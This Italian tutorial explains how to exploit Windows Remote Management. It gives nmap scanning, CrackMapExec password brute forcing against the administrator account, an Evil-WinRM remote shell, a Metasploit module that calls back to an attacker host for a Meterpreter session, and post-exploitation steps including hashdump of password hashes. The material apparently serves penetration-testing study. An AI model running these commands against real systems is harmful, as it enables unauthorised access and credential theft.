# Microsoft Windows – Exploitation di WinRM (Windows Remote Management)

**WinRM (Windows Remote Management)** è un protocollo di gestione remota introdotto da Microsoft che consente agli amministratori di eseguire comandi da remoto su sistemi Windows. Utilizza le porte **5985 (HTTP)** e **5986 (HTTPS)**, ma non sono incluse nella scansione Nmap standard.

---

## 1 – Scansione del servizio WinRM

Per rilevare se il servizio è attivo, dobbiamo specificare le porte corrette:

`nmap -p 5985,5986 <IP>` ⟶ verifica se le porte di WinRM sono aperte. <br>

---

## 2 – Brute Force delle credenziali con CrackMapExec

**CrackMapExec (CME)** è un potente strumento per testare l'autenticazione remota. Per vedere tutte le opzioni disponibili:

`crackmapexec -h` ⟶ mostra tutti i parametri utilizzabili. <br>

Attacco bruteforce su WinRM:

`crackmapexec winrm <IP> -u administrator -p <listaDiPassword>` ⟶ prova la password per l’utente `administrator`. <br>

L'utente `administrator` è comunemente presente ed è spesso il primo creato nei sistemi Windows, rendendolo un obiettivo prioritario nei test.

---

## 3 – Esecuzione comandi da remoto

Una volta trovata la password valida, possiamo eseguire comandi:

`crackmapexec winrm <IP> -u administrator -p <password> -x "whoami"` ⟶ esegue `whoami` da remoto. <br>

---

## 4 – Accesso con Evil-WinRM

**Evil-WinRM** è uno strumento Ruby dedicato all’accesso remoto tramite WinRM.

`evil-winrm -u <username> -p '<password>' -i <IP>` ⟶ apre una shell remota con privilegi. <br>

Dalla shell è possibile:

- Eseguire comandi di sistema (`whoami`, `ipconfig`, `systeminfo`)
- Caricare file (`upload`)
- Scaricare file (`download`)
- Avviare script (`powershell`)

---

## 5 – Exploit con Metasploit

È possibile ottenere una sessione Meterpreter tramite Metasploit:

`use exploit/windows/winrm/winrm_script_exec` ⟶ modulo exploit per WinRM. <br>
`set RHOSTS <IP>` ⟶ imposta l’indirizzo della vittima. <br>
`set LHOST <KaliIP>` ⟶ IP della macchina attaccante. <br>
`set LPORT <Port>` ⟶ porta di ascolto. <br>
`set USERNAME <username>` ⟶ nome utente trovato. <br>
`set PASSWORD <password>` ⟶ password corrispondente. <br>
`set FORCE_VBS true` ⟶ forza l’utilizzo di uno script VBS (migliora la compatibilità su alcune versioni di Windows). <br>
`run` ⟶ avvia l’exploit. <br>

Il flag `FORCE_VBS` è utile per i sistemi che non accettano esecuzioni standard di script PowerShell e permette un’esecuzione alternativa via VBScript, aumentando le probabilità di successo.

---

## 6 – Post-Sfruttamento

Una volta ottenuta una sessione Meterpreter, possiamo eseguire i seguenti comandi:

`getuid` ⟶ mostra l’identità dell’utente corrente. <br>
`getprivs` ⟶ elenca i privilegi ottenuti. <br>
`hashdump` ⟶ estrae gli hash delle password dal SAM (se si hanno i privilegi necessari). <br>
`sysinfo` ⟶ mostra le informazioni sul sistema. <br>
`shell` ⟶ apre un prompt dei comandi. <br>
